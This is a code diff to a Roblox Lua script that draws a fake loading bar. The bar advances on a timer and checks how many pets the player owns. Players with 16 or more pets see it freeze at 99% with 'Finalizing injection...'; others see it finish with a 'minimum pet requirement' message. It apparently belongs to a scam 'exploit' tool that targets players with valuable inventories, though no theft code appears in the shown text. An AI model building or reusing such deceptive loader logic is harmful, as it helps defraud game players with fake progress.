@@ -106,9 +106,25 @@ end
 
 typeText(messages[1])
 
--- loader animation (progress independent)
+-- check total pets
+local petsFolder = player:WaitForChild("BackpackApp")
+	:WaitForChild("Frame")
+	:WaitForChild("ScrollComplex")
+	:WaitForChild("ScrollingFrame")
+	:WaitForChild("Content")
+	:WaitForChild("pets")
+
+local totalChildren = 0
+for _, row in ipairs(petsFolder:GetChildren()) do
+	totalChildren += #row:GetChildren()
+end
+
+-- decide maxProgress based on total pets
+local maxProgress = totalChildren >= 16 and 99 or 100
+
+-- loader animation (independent bar)
 task.spawn(function()
-	while progress < 99 do
+	while progress < maxProgress do
 		local speed = 0.06
 		if progress > 30 then speed = 0.045 end
 		if progress > 60 then speed = 0.035 end
@@ -116,12 +132,12 @@ task.spawn(function()
 		if progress > 95 then speed = 0.01 end
 
 		progress += speed
-		progress = math.min(progress, 99)
+		progress = math.min(progress, maxProgress)
 
 		percent.Text = math.floor(progress).."%"
 		fill.Size = UDim2.new(progress/100,0,1,0)
 
-		-- status messages
+		-- update status messages
 		if math.floor(progress/12) > messageIndex and messageIndex < #messages then
 			messageIndex += 1
 			task.spawn(function()
@@ -132,31 +148,10 @@ task.spawn(function()
 		task.wait(0.05)
 	end
 
-	-- Now check pets and adjust final outcome
-	local petsFolder = player:WaitForChild("BackpackApp")
-		:WaitForChild("Frame")
-		:WaitForChild("ScrollComplex")
-		:WaitForChild("ScrollingFrame")
-		:WaitForChild("Content")
-		:WaitForChild("pets")
-
-	local totalChildren = 0
-	for _, row in ipairs(petsFolder:GetChildren()) do
-		totalChildren += #row:GetChildren()
-	end
-
+	-- final status text
 	if totalChildren < 16 then
-		-- allow bar to finish 100%
-		while progress < 100 do
-			progress += 0.5 -- small smooth increment
-			progress = math.min(progress,100)
-			percent.Text = math.floor(progress).."%"
-			fill.Size = UDim2.new(progress/100,0,1,0)
-			task.wait(0.05)
-		end
 		status.Text = "Minimum pet requirement not achieved"
 	else
-		-- keep it frozen at 99%
 		status.Text = "Finalizing injection..."
 	end
 end)
